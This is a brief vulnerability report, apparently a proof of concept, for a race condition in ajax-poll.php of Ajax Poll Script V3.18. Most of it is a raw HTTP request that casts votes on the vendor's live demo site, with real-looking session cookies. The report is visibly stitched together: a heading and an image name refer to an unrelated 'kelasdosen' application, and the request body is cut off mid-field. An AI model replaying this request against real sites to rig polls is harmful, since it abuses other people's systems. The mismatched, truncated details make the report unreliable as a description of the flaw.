Ajax Poll Script V3.18

#### Race Condition in  ajax-poll.php

POST /ci_exam/kelasdosen/data*
```
POST /mod/APSMX/v3.18/demo/ajax-poll.php HTTP/1.1
Host: www.phpkobo.com
Cookie: _ga_MF4T7FRWJW=GS1.1.1695961768.2.0.1695961768.60.0.0; _ga=GA1.2.1083278510.1695955758; MYSESSID=8441e3fbe99db3ebb8611abe9fbb6c71; _gid=GA1.2.203578192.1695955762; __gads=ID=4ea18a3f062405c6-22006a7731e40097:T=1695955931:RT=1695961770:S=ALNI_MbrSNI4mZtRvp2gS8VWRqJdV8ReYA; __gpi=UID=00000c55144b37b0:T=1695955931:RT=1695961770:S=ALNI_ManE6wESYRFeFmWItO2vJuW5rq2Yw
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: */*
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 142
Test: 43
Origin: https://www.phpkobo.com
Referer: https://www.phpkobo.com/ajax_poll.php
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

cmd=vote&answer=%5B%22Vancouver%22%5D&appid=WbOqpMWLRsLA0b6VTOkmvyj04xZO8LZaFKPVx8S6tNeVbJYfcZVHWBpRZkwqrch6&tclass=poll-background-image&tid=```
PoC Image:

![PoC Image](img/kelasdosen.png "POC IMAGE")

